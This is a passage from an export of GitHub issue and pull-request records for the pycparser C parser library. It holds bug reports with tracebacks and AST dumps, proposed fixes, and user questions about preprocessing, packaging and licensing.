#endif /* SIGNALHANDLER_H_ */
```

I expect to see nothing. FuncDecl != pointer to function.
How to distinguish a pointer to function from a function declaration?

```py
from __future__ import print_function
from pycparser import c_ast, parse_file, c_generator
import sys

# This is not required if you've installed pycparser into
# your site-packages/ with setup.py
sys.path.extend(['.', '..'])


class FuncDeclVisitor(c_ast.NodeVisitor):
    nodes = []

    def visit_FuncDecl(self, node):
        self.nodes.append(node)


def main():
    c_header = sys.argv[1]
    ast = parse_file(c_header, use_cpp=True, cpp_args=r'-Iutils/fake_libc_include')
    visitor = FuncDeclVisitor()
    visitor.visit(ast)
    generator = c_generator.CGenerator()
    if len(visitor.nodes) > 0:
        for node in visitor.nodes:
            print(node)


if __name__ == ""__main__"":
    main()
```

```py
FuncDecl(args=ParamList(params=[Decl(name='signum',
                                     quals=[
                                           ],
                                     storage=[
                                             ],
                                     funcspec=[
                                              ],
                                     type=TypeDecl(declname='signum',
                                                   quals=[
                                                         ],
                                                   type=IdentifierType(names=['int'
                                                                             ]
                                                                       )
                                                   ),
                                     init=None,
                                     bitsize=None
                                     )
                               ]
                        ),
         type=TypeDecl(declname='SignalHandler',
                       quals=[
                             ],
                       type=IdentifierType(names=['void'
                                                 ]
                                           )
                       )
         )
```


",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/377/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/377/comments,https://api.github.com/repos/eliben/pycparser/issues/377/events,https://github.com/eliben/pycparser/issues/377,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/376,616702253,MDU6SXNzdWU2MTY3MDIyNTM=,376,Debugging: file and line number,5795220,closed,FALSE,NA,NA,1,2020-05-12T14:27:54Z,2020-05-26T01:56:31Z,2020-05-26T01:56:31Z,NONE,NA,"I'm curious if there's some way to trace errors back to the original file. 

If not, can we use #line directives for this?

If this is acceptable, I'm happy to work up a PR.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/376/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/376/comments,https://api.github.com/repos/eliben/pycparser/issues/376/events,https://github.com/eliben/pycparser/issues/376,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/375,610668387,MDU6SXNzdWU2MTA2NjgzODc=,375,TypeError: 'NoneType' object is not iterable in visit_case function of c_generator.py,17273656,open,FALSE,NA,NA,1,2020-05-01T09:43:54Z,2020-05-01T12:12:21Z,NA,NONE,NA,"Hi eliben, thanks for your pycparser.

I noticed there may be a small issue in c_generator.py.

The statement in `case` could be none. For example,
```c
enum 
{
  enum_constant_0,
  enum_constant_1,
  enum_constant_2,
  enum_constant_3
} var_0;
extern void foo();
extern void bar();
void test()
{
  switch (var_0)
  {
    case enum_constant_1:

    case enum_constant_2:
      foo();

    case enum_constant_3:
      bar();

  }
}

```

However, when we use `c_generator.CGenerator()` to recover code from json ast fomat, it will meet the error
```
  File ""python3.6/site-packages/pycparser/c_generator.py"", line 253, in visit_Case
    for stmt in n.stmts:
TypeError: 'NoneType' object is not iterable
```

The code is 
```
    def visit_Case(self, n):
        s = 'case ' + self.visit(n.expr) + ':\n'
        for stmt in n.stmts:
            s += self._generate_stmt(stmt, add_indent=True)
        return s
```

A possible fix
```
    def visit_Case(self, n):
        s = 'case ' + self.visit(n.expr) + ':\n'
        if n.stmts != None:
            for stmt in n.stmts:
                s += self._generate_stmt(stmt, add_indent=True)
        return s
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/375/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/375/comments,https://api.github.com/repos/eliben/pycparser/issues/375/events,https://github.com/eliben/pycparser/issues/375,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/374,608449880,MDU6SXNzdWU2MDg0NDk4ODA=,374,Parsing of structure,64488569,closed,FALSE,NA,NA,1,2020-04-28T16:25:37Z,2020-04-29T12:54:17Z,2020-04-29T12:54:17Z,NONE,NA,"Hello!

I have the following C code:
``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


struct s_level1 {
        char *ptr;
        char array[10];
} level1_t;

struct s_level0 {
        struct s_level1 level1;
        struct s_level1 level1bis;
        char payload[10];
} packet_t;

void function(char array[])
{
}

int main() {
    struct s_level0 level0;

    level0.level1.ptr = NULL;
    level0.level1.ptr = malloc(100*sizeof(char));

    printf(""%s\n"", level0.level1.ptr);
    function(level0.level1.array);
    printf(""End\n"");

    return 0;
}
```

When Pycparser reaches the line 
`function(level0.level1.array)`
I have this output:

```python
...

FuncCall(name=ID(name='function'
                 ),
         args=ExprList(exprs=[StructRef(name=StructRef(name=ID(name='level0'
                                                               ),
                                                       type='.',
                                                       field=ID(name='level1'
                                                                )
                                                       ),
                                        type='.',
                                        field=ID(name='array'
                                                 )
                                        )
                             ]
                       )
         ),

...
```
Just after level0, we have the type then we go to level1. But after level1, we close the parenthesis twice ... Is it normal ? I imagined something like that:

```python
...

FuncCall(name=ID(name='function'
                 ),
         args=ExprList(exprs=[StructRef(name=StructRef(name=ID(name='level0'
                                                               ),
                                                       type='.',
                                                       field=ID(name='level1'
                                                                ),
                                                       type='.',
                                                       field=ID(name='array'
                                                              )
                                        ),
                             ]
                       )
         ),

...
```
I thank you in advance!",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/374/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/374/comments,https://api.github.com/repos/eliben/pycparser/issues/374/events,https://github.com/eliben/pycparser/issues/374,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/373,606783106,MDU6SXNzdWU2MDY3ODMxMDY=,373,feat: support code snippet,9780746,closed,FALSE,NA,NA,2,2020-04-25T14:39:39Z,2020-04-26T09:26:34Z,2020-04-25T14:59:05Z,NONE,NA,"Would be nice if pycparser can support parsing C code snippet. For example, the following is a valid C code snippet but pycparser cannot parse as it only supports parsing file-level C code (as far as I think).

```c
if (1) {}
```

The example above cannot be parsed by pycparser 2.20 .",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/373/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/373/comments,https://api.github.com/repos/eliben/pycparser/issues/373/events,https://github.com/eliben/pycparser/issues/373,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/372,590884407,MDU6SXNzdWU1OTA4ODQ0MDc=,372,Commercial Usage,10250923,closed,FALSE,NA,NA,1,2020-03-31T07:59:41Z,2020-03-31T13:05:42Z,2020-03-31T13:05:41Z,NONE,NA,"
We are using this module https://github.com/eliben/pycparser in our application with Django.

Can you please confirm if its okay to be used commercially.

Thank you in advance",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/372/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/372/comments,https://api.github.com/repos/eliben/pycparser/issues/372/events,https://github.com/eliben/pycparser/issues/372,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/371,589578166,MDU6SXNzdWU1ODk1NzgxNjY=,371,AttributeError: 'ID' object has no attribute 'type',52910433,closed,FALSE,NA,NA,1,2020-03-28T13:32:11Z,2020-03-28T13:39:41Z,2020-03-28T13:39:41Z,NONE,NA,"i need to lint my code that contains a lots of function defined like : 

int function( myString )
char* myString ;{
// code here
}

my gcc is able to compile this kind of prototype but pycparser returns this error : 
-----------------------------------------------------------------------------------------
Traceback (most recent call last):
  File ""testLinter.py"", line 88, in <module>
    show_func_defs(filename)
  File ""testLinter.py"", line 79, in show_func_defs
    v.visit(ast)
  File ""Python37\lib\site-packages\pycparser\c_ast.py"", line 158, in visit
    return visitor(node)
  File ""Python37\lib\site-packages\pycparser\c_ast.py"", line 165, in generic_visit
    self.visit(c)
  File ""Python37\lib\site-packages\pycparser\c_ast.py"", line 158, in visit
    return visitor(node)
  File ""testLinter.py"", line 43, in visit_FuncDef
    if type(params.type) is c_ast.PtrDecl:
AttributeError: 'ID' object has no attribute 'type'
--------------------------------------------------------------------------------------------------------

any help please 
thank you ",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/371/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/371/comments,https://api.github.com/repos/eliben/pycparser/issues/371/events,https://github.com/eliben/pycparser/issues/371,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/370,587424411,MDU6SXNzdWU1ODc0MjQ0MTE=,370,"i wanna convert ast to cfg, but i have no idea,cause im not a coumputer professional student, can you give me some adivce?",27109334,closed,FALSE,NA,NA,1,2020-03-25T03:55:54Z,2020-03-25T12:20:00Z,2020-03-25T12:20:00Z,NONE,NA,"hello dear friend,
im major in mechinesm, but you know that  you could select courses no matter which college you are in, so i select a class which name <Software source code analysis> ， just cause i ever used pyqt5, so im happy to take a class ,and feel sad when the teacher give us a Semester assignment.
he want us to analysis a c code and get the cfg and du path.
im major in mechinsm, and im familiar with my profeesinal courses and python，but i don know about compilation principle.
so i try to find how to solve my assignment in github , in stackflow and so on. i find  your package could generate an ast.
and now i want to convert it to cfg, so i want get your views about this.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/370/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/370/comments,https://api.github.com/repos/eliben/pycparser/issues/370/events,https://github.com/eliben/pycparser/issues/370,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/369,578502220,MDU6SXNzdWU1Nzg1MDIyMjA=,369,Not able to parse my header file,13626231,closed,FALSE,NA,NA,2,2020-03-10T11:08:15Z,2020-03-12T12:05:30Z,2020-03-12T12:05:30Z,NONE,NA,"Hello, 

I am facing an issue when try to create a parser for my header file called _Debug.h_ as shown below. However I cannot understand the error itself, could you explain me what the error is trying to say? Is the backslash associated to the comments in _Debug.h_ an issue for the parser?

Thanks in advance,



```
fileName = ""C:\\LocalData\\Projects\\git\\firmware\\SDR\\Common\\Debug.h""
ast = parse_file(fileName, use_cpp=False)

ast = parse_file(fileName, use_cpp=False)
Traceback (most recent call last):
  File ""C:\LocalData\WPy64-3810\python-3.8.1.amd64\lib\site-packages\IPython\core\interactiveshell.py"", line 3319, in run_code
    exec(code_obj, self.user_global_ns, self.user_ns)
  File ""<ipython-input-37-9c4431fc25a6>"", line 1, in <module>
    ast = parse_file(fileName, use_cpp=False)
  File ""C:\LocalData\WPy64-3810\python-3.8.1.amd64\lib\site-packages\pycparser\__init__.py"", line 90, in parse_file
    return parser.parse(text, filename)
  File ""C:\LocalData\WPy64-3810\python-3.8.1.amd64\lib\site-packages\pycparser\c_parser.py"", line 149, in parse
    return self.cparser.parse(
  File ""C:\LocalData\WPy64-3810\python-3.8.1.amd64\lib\site-packages\pycparser\ply\yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""C:\LocalData\WPy64-3810\python-3.8.1.amd64\lib\site-packages\pycparser\ply\yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""C:\LocalData\WPy64-3810\python-3.8.1.amd64\lib\site-packages\pycparser\ply\yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""C:\LocalData\WPy64-3810\python-3.8.1.amd64\lib\site-packages\pycparser\c_parser.py"", line 1845, in p_error
    self._parse_error(
  File ""C:\LocalData\WPy64-3810\python-3.8.1.amd64\lib\site-packages\pycparser\plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: C:\LocalData\Projects\git\firmware\SDR\Common\Debug.h:1:1: before: /
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/369/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/369/comments,https://api.github.com/repos/eliben/pycparser/issues/369/events,https://github.com/eliben/pycparser/issues/369,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/368,577463297,MDExOlB1bGxSZXF1ZXN0Mzg1MjM5NTAw,368,"Add some ""types"" to zlib.h",204496,closed,FALSE,NA,NA,1,2020-03-08T08:12:18Z,2020-03-11T12:23:24Z,2020-03-11T12:23:24Z,CONTRIBUTOR,NA,"Since `pycparser` includes a `zlib.h` some of the types defined by the real `zlib.h` is also required.

I'm not sure if the guarding #ifdef should be around the inclusion of the other fakes.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/368/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/368/comments,https://api.github.com/repos/eliben/pycparser/issues/368/events,https://github.com/eliben/pycparser/pull/368,https://api.github.com/repos/eliben/pycparser/pulls/368
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/367,576696197,MDU6SXNzdWU1NzY2OTYxOTc=,367,Running Pycparser on entire repository,36818228,closed,FALSE,NA,NA,1,2020-03-06T04:48:18Z,2020-03-06T13:19:32Z,2020-03-06T13:19:32Z,NONE,NA,"No, there's no magic solution. You have to do it the way the blog post described. Typical projects using pycparser apply it to a small number of code-bases, so this is just a one time ""start up cost"" that gets amortized over the lifetime of the project.

It's not clear to me what you mean by ""can't pre-process every file one by one"". The compiler compiles a project ""every file one by one"", so pycparser would need to analyze each project in the same way.

_Originally posted by @eliben in https://github.com/eliben/pycparser/issues/361#issuecomment-581904058_

I don't need any magic solution, just need to know that can this be automated by script or have to do everything manually? By ""can't pre-process every file one by one"", I mean that I can't do it manually for every file in repository. There will be thousands of file in project, how can I do it manually for every file? ",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/367/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/367/comments,https://api.github.com/repos/eliben/pycparser/issues/367/events,https://github.com/eliben/pycparser/issues/367,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/366,575179486,MDU6SXNzdWU1NzUxNzk0ODY=,366,voidpf not defined by fake_lib/zlib.h,204496,closed,FALSE,NA,NA,6,2020-03-04T06:59:26Z,2020-03-11T12:46:34Z,2020-03-11T12:46:34Z,CONTRIBUTOR,NA,"Standard `zlib.h` defines `voidpf` which is not defined by `fake_typedefs.h`. I suppose that since `fake_lib` catches `zlib.h` so should define all things in `/usr/include/zlib.h` and thus `/usr/include/zconf.h`.

My hack for fixing it for me was to send the following CPP arguments:

    -Dvoidpf=int -DuInt=int",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/366/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/366/comments,https://api.github.com/repos/eliben/pycparser/issues/366/events,https://github.com/eliben/pycparser/issues/366,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/365,574718454,MDU6SXNzdWU1NzQ3MTg0NTQ=,365,Release version 2.20,1130906,closed,FALSE,NA,NA,3,2020-03-03T14:45:04Z,2020-03-09T12:52:24Z,2020-03-09T12:52:24Z,OWNER,NA,"This is a planning issue for releasing version 2.20

For #359 I will try to push a wheel with this release. Also, there hasn't been a release since Sep 2018, so it's time.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/365/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/365/comments,https://api.github.com/repos/eliben/pycparser/issues/365/events,https://github.com/eliben/pycparser/issues/365,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/364,570689820,MDExOlB1bGxSZXF1ZXN0Mzc5NjgzMTE2,364,Fix #363 incorrect AST when parsing offsetof,5766101,closed,FALSE,NA,NA,1,2020-02-25T16:22:57Z,2020-03-03T17:35:55Z,2020-03-03T14:33:12Z,CONTRIBUTOR,NA,"This PR addresses #363, where parsing `offsetof` expressions generates incorrect ASTs.

The main change is eliminating the duplicate `ID` node constructed in `p_offsetof_member_designator`. New tests are added to check the entire structure of parsed `StructRef` and `ArrayRef` nodes in an `offsetof` expression.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/364/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/364/comments,https://api.github.com/repos/eliben/pycparser/issues/364/events,https://github.com/eliben/pycparser/pull/364,https://api.github.com/repos/eliben/pycparser/pulls/364
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/363,570247911,MDU6SXNzdWU1NzAyNDc5MTE=,363,Incorrect AST structure when parsing `offsetof` expressions.,5766101,closed,FALSE,NA,NA,2,2020-02-25T01:20:32Z,2020-03-27T16:32:17Z,2020-03-03T14:33:13Z,CONTRIBUTOR,NA,"I am using the latest commit on `master` branch (`1166ea1`).

Take the following code as example:
```c
int x = offsetof(struct A, a.b);
```
The generated parse tree is:
```python
FileAST(ext=[Decl(name='x',
                  quals=[],
                  storage=[],
                  funcspec=[],
                  type=TypeDecl(declname='x',
                                quals=[],
                                type=IdentifierType(names=['int'])),
                  init=FuncCall(name=ID(name='offsetof'),
                                args=ExprList(exprs=[Typename(name=None,
                                                              quals=[],
                                                              type=TypeDecl(declname=None,
                                                                            quals=[],
                                                                            type=Struct(name='A',
                                                                                        decls=None))),
                                                     StructRef(name=ID(name='a'),
                                                               type='.',
                                                               field=ID(name=ID(name='b')))])),
                  bitsize=None)])
```
where the `field` attribute of `StructRef` has a value of `ID(name=ID(name='b'))` instead of just `ID(name='b')`.

I think the issue is with the production rules of `offsetof_member_designator` that was introduced in #145, namely:
https://github.com/eliben/pycparser/blob/1166ea11785ce12cdfd5e8bf8b3a69b5e6b76f9c/pycparser/c_parser.py#L1735-L1748
In the `len(p) == 4` case, `StructRef` should be created using `p[3]` directly, instead of constructing an `ID` first.

If you agree with my analysis, I'd be happy to create a patch.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/363/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/363/comments,https://api.github.com/repos/eliben/pycparser/issues/363/events,https://github.com/eliben/pycparser/issues/363,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/362,562122415,MDU6SXNzdWU1NjIxMjI0MTU=,362,Error  inside _fake_typedefs.h file on the line containing void* declaration while running parse_file function,36818228,closed,FALSE,NA,NA,1,2020-02-09T04:58:37Z,2020-02-11T00:23:43Z,2020-02-11T00:23:43Z,NONE,NA,"Python 3.6.10 (default, Dec 19 2019, 23:04:32) 
[GCC 5.4.0 20160609] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import pycparser
>>> pycparser.parse_file('run_pp.c')
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/__init__.py"", line 90, in parse_file
    return parser.parse(text, filename)
  File ""/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/c_parser.py"", line 1862, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/home/shubham/Desktop/Windows/BTP/astnn-master/preprocess_pycparser/pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: utils/fake_libc_include/_fake_typedefs.h:156:9: before: 1
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/362/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/362/comments,https://api.github.com/repos/eliben/pycparser/issues/362/events,https://github.com/eliben/pycparser/issues/362,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/361,559537203,MDU6SXNzdWU1NTk1MzcyMDM=,361,Running pycparser on entire project repositories,36818228,closed,FALSE,NA,NA,1,2020-02-04T07:32:32Z,2020-02-04T13:14:53Z,2020-02-04T13:14:53Z,NONE,NA,"I needed to use pycparser project so I went through this blog https://eli.thegreenplace.net/2015/on-parsing-c-type-declarations-and-fake-headers

By, going through this, I realized that it's very tough to run this project on some big project, which I actually need too do. As in blog you showed that we need to tackle every header problem one by one and we are knowing about what to include in this pre-processing command  after getting error one by one

gcc -nostdinc -E -D'__attribute__(x)=' -Iredis/src \
                   -Ipycparser/utils/fake_libc_include \
                   -Iredis/deps/lua/src redis/src/redis.c > redis_pp.c

Can you help me by giving some script or pointing me to some script if I want to run it on  every file of some repository as we can't pre-process every file one by one.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/361/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/361/comments,https://api.github.com/repos/eliben/pycparser/issues/361/events,https://github.com/eliben/pycparser/issues/361,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/360,549468408,MDU6SXNzdWU1NDk0Njg0MDg=,360,Generator generates incorrect AST for a function with return type 'void*',37955368,closed,FALSE,NA,NA,1,2020-01-14T10:22:10Z,2020-01-14T11:47:49Z,2020-01-14T11:47:00Z,NONE,NA,"Hi,

I have a function

```c
void* memmgr_alloc(int nbytes);
```

I expect to see void* but I see void.
```python
from __future__ import print_function
from pycparser import c_ast, parse_file, c_generator
import sys

# This is not required if you've installed pycparser into
# your site-packages/ with setup.py
sys.path.extend(['.', '..'])


class FuncDeclVisitor(c_ast.NodeVisitor):
    nodes = []

    def visit_FuncDecl(self, node):
        self.nodes.append(node)


def main():
    c_header = sys.argv[1]
    ast = parse_file(c_header, use_cpp=True, cpp_args=r'-Iutils/fake_libc_include')
    visitor = FuncDeclVisitor()
    visitor.visit(ast)
    generator = c_generator.CGenerator()
    if len(visitor.nodes) > 0:
        for node in visitor.nodes:
            print(node)
            print(generator.visit(node.type.type))  # I expect to see 'void*' but I see 'void'


if __name__ == ""__main__"":
    main()

```



pycparser generated ast:
```python
FuncDecl(args=ParamList(params=[Decl(name='nbytes',
                                     quals=[
                                           ],
                                     storage=[
                                             ],
                                     funcspec=[
                                              ],
                                     type=TypeDecl(declname='nbytes',
                                                   quals=[
                                                         ],
                                                   type=IdentifierType(names=['int'
                                                                             ]
                                                                       )
                                                   ),
                                     init=None,
                                     bitsize=None
                                     )
                               ]
                        ),
         type=PtrDecl(quals=[
                            ],
                      type=TypeDecl(declname='memmgr_alloc',
                                    quals=[
                                          ],
                                    type=IdentifierType(names=['void'
                                                              ]
                                                        )
                                    )
                      )
         )

Process finished with exit code 0

```

",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/360/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/360/comments,https://api.github.com/repos/eliben/pycparser/issues/360/events,https://github.com/eliben/pycparser/issues/360,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/359,541275374,MDU6SXNzdWU1NDEyNzUzNzQ=,359,Publish sdist and bdist wheel,343415,closed,FALSE,NA,NA,14,2019-12-21T03:21:06Z,2020-03-04T14:22:21Z,2020-03-04T14:22:21Z,NONE,NA,"The benefits of wheels are well documented. See: https://pythonwheels.com/
This package is pure Python and publishing it as both source and as a wheel is simple.

Would you accept a contribution to add a Makefile to this repo that would allow you to build both source distribution (sdist) and built distribution (wheel)?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/359/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/359/comments,https://api.github.com/repos/eliben/pycparser/issues/359/events,https://github.com/eliben/pycparser/issues/359,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/358,534616443,MDExOlB1bGxSZXF1ZXN0MzUwNDY1MTU1,358,Update README to warn about missing support files,3310349,closed,FALSE,NA,NA,1,2019-12-08T22:49:41Z,2020-03-03T14:30:29Z,2020-03-03T14:30:29Z,NONE,NA,#224,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/358/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/358/comments,https://api.github.com/repos/eliben/pycparser/issues/358/events,https://github.com/eliben/pycparser/pull/358,https://api.github.com/repos/eliben/pycparser/pulls/358
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/357,533988293,MDExOlB1bGxSZXF1ZXN0MzQ5OTY3MjY5,357,Add unaligned versions of intel vector types,974662,closed,FALSE,NA,NA,0,2019-12-06T13:36:37Z,2019-12-07T13:31:07Z,2019-12-07T13:31:07Z,CONTRIBUTOR,NA,NA,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/357/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/357/comments,https://api.github.com/repos/eliben/pycparser/issues/357/events,https://github.com/eliben/pycparser/pull/357,https://api.github.com/repos/eliben/pycparser/pulls/357
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/356,530868212,MDU6SXNzdWU1MzA4NjgyMTI=,356,"add helper for replacing a node, i.e. replace(parent_node, old_node, new_node)",23122675,closed,FALSE,NA,NA,3,2019-12-02T03:37:13Z,2020-03-03T14:37:50Z,2020-03-03T14:37:49Z,NONE,NA,"I am not sure if pycparser is meant mostly for read-only access to the AST or if modifications are 
""in scope"". In the latter case a helper  for updating nodes would be useful.
Concretely, something like this:

https://github.com/robertmuth/Cwerg/blob/034b6c9f135f39847b8957455e256d22175a6ad3/common.py#L171

Hopefully, there is some introspection magic that would make this less verbose and error prone.

",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/356/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/356/comments,https://api.github.com/repos/eliben/pycparser/issues/356/events,https://github.com/eliben/pycparser/issues/356,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/355,517066561,MDU6SXNzdWU1MTcwNjY1NjE=,355,Avoid __file__,15092,closed,FALSE,NA,NA,1,2019-11-04T10:36:19Z,2019-11-04T13:27:27Z,2019-11-04T13:27:26Z,NONE,NA,"`pycparser` and thus `cffi` are failing in PyOxidizer because `pycparser.ply.lex` is expecting `pycparser.c_lexer` and `pycparser.c_parser` to have a `__file__`

```py
cffi.api:112: in cdef
    ???
cffi.api:126: in _cdef
    ???
cffi.cparser:358: in parse
    ???
cffi.cparser:363: in _internal_parse
    ???
cffi.cparser:305: in _parse
    ???
cffi.cparser:52: in _get_parser
    ???
pycparser.c_parser:88: in __init__
    ???
pycparser.c_lexer:66: in build
    ???
pycparser.ply.lex:894: in lex
    ???
E   AttributeError: module 'pycparser.c_lexer' has no attribute '__file__'
```

I can populate those `__file__` with `'junk'` and it seems that my build gets a _lot_ further, so possible those values are not needed.  Or there could be a fallback, such as using `importlib.resources`.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/355/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/355/comments,https://api.github.com/repos/eliben/pycparser/issues/355/events,https://github.com/eliben/pycparser/issues/355,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/354,512217870,MDExOlB1bGxSZXF1ZXN0MzMyMjcyNjU0,354,Fix simple typo: Diagonistic -> Diagnostic,47873678,closed,FALSE,NA,NA,1,2019-10-24T22:49:52Z,2019-10-27T13:11:49Z,2019-10-27T13:11:49Z,NONE,NA,Fixes #353 ,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/354/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/354/comments,https://api.github.com/repos/eliben/pycparser/issues/354/events,https://github.com/eliben/pycparser/pull/354,https://api.github.com/repos/eliben/pycparser/pulls/354
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/353,512217815,MDU6SXNzdWU1MTIyMTc4MTU=,353,Simple typo in pycparser/ply/yacc.py - Diagonistic,47873678,closed,FALSE,NA,NA,2,2019-10-24T22:49:41Z,2019-11-08T02:36:37Z,2019-10-27T13:11:37Z,NONE,NA,Should be Diagnostic instead.,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/353/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/353/comments,https://api.github.com/repos/eliben/pycparser/issues/353/events,https://github.com/eliben/pycparser/issues/353,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/352,498871359,MDU6SXNzdWU0OTg4NzEzNTk=,352,int8_t not supported,7817509,closed,FALSE,NA,NA,1,2019-09-26T13:03:39Z,2019-09-26T13:05:47Z,2019-09-26T13:05:46Z,NONE,NA,"The C type `int8_t` does not appear to be recognized:
```
  File ""/home/zingale/.local/lib/python2.7/site-packages/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/home/zingale/.local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/home/zingale/.local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
